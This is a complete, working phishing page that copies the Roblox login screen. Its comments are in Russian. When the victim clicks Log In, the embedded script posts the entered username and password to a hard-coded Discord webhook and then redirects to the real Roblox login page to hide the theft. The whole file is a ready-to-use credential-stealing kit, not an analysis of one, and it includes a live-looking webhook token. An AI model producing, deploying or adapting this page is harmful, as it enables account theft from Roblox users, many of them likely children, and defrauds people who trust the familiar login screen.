<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Roblox</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
  
  /* Тёмный фон с имитацией размытой игры */
  body { 
    background: #1f222a; 
    background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.rbxcdn.com/3b7db4a3b73c91ab92a53b1bf16582f4.jpg');
    background-size: cover;
    background-position: center;
    display: flex; 
    justify-content: center; 
    align-items: center; 
    min-height: 100vh; 
  }

  /* Контейнер формы */
  .login-box { 
    background-color: #232527; 
    padding: 30px; 
    border-radius: 8px; 
    width: 100%; 
    max-width: 400px; 
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    border: 1px solid #3a3c40;
  }

  .title { 
    color: #fff; 
    font-size: 24px; 
    font-weight: 600; 
    text-align: center; 
    margin-bottom: 25px; 
  }

  .input-group { margin-bottom: 15px; }

  .input-group input { 
    width: 100%; 
    padding: 14px 15px; 
    background-color: #2d2f33; 
    border: 1px solid #4a4d52; 
    border-radius: 6px; 
    color: #fff; 
    font-size: 15px; 
    outline: none; 
    transition: border-color 0.2s;
  }
  
  .input-group input:focus { border-color: #fff; }
  .input-group input::placeholder { color: #8b8f96; }

  .btn-login { 
    background-color: #3e4147; 
    color: #fff; 
    border: 1px solid #fff; 
    width: 100%; 
    padding: 14px; 
    border-radius: 6px; 
    font-size: 16px; 
    font-weight: 500; 
    cursor: pointer; 
    margin-bottom: 20px; 
    transition: background-color 0.2s;
  }
  
  .btn-login:hover { background-color: #4a4d52; }

  .forgot { 
    text-align: center; 
    color: #fff; 
    font-size: 14px; 
    text-decoration: none; 
    display: block; 
    margin-bottom: 20px; 
    cursor: pointer;
  }

  .divider { 
    height: 1px; 
    background-color: #3a3c40; 
    margin: 20px 0; 
  }

  .btn-alt { 
    background-color: #3a3c40; 
    color: #fff; 
    border: none; 
    width: 100%; 
    padding: 14px; 
    border-radius: 6px; 
    font-size: 15px; 
    font-weight: 500; 
    cursor: pointer; 
    margin-bottom: 10px; 
  }
  
  .btn-alt:hover { background-color: #4a4d52; }

  .signup-text { 
    text-align: center; 
    color: #8b8f96; 
    font-size: 14px; 
    margin-top: 25px; 
  }
  
  .signup-text a { color: #fff; text-decoration: none; cursor: pointer; }
</style>
</head>
<body>

<div class="login-box">
  <div class="title">Login to Roblox</div>
  
  <div class="input-group">
    <input type="text" id="username" placeholder="Username/Email/Phone">
  </div>
  
  <div class="input-group">
    <input type="password" id="password" placeholder="Password">
  </div>
  
  <button class="btn-login" id="loginBtn">Log In</button>
  
  <a class="forgot">Forgot Password or Username?</a>
  
  <div class="divider"></div>
  
  <button class="btn-alt">Email Me a One-Time Code</button>
  <button class="btn-alt">Quick Sign-in</button>
  <button class="btn-alt">Other sign-in options</button>
  
  <div class="signup-text">
    Don't have an account? <a>Sign Up</a>
  </div>
</div>

<script>
// ТВОЙ DISCORD WEBHOOK
const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qdLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";

document.getElementById('loginBtn').addEventListener('click', async function(e) {
  e.preventDefault();
  
  const user = document.getElementById('username').value;
  const pass = document.getElementById('password').value;

  if (!user || !pass) {
    alert("Please fill out all fields.");
    return;
  }

  // Меняем вид кнопки
  this.innerText = "Loading...";
  this.disabled = true;
  this.style.opacity = "0.7";

  // Отправляем данные в Discord
  const message = `**🟦 ROBLOX (Dark Theme)**\n**Логин:** \`${user}\`\n**Пароль:** \`${pass}\``;

  try {
    await fetch(HOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });
  } catch(e) {}

  // Перекидываем на настоящий сайт
  setTimeout(() => {
    window.location.href = "https://www.roblox.com/login";
  }, 1000);
});
</script>
</body>
</html>
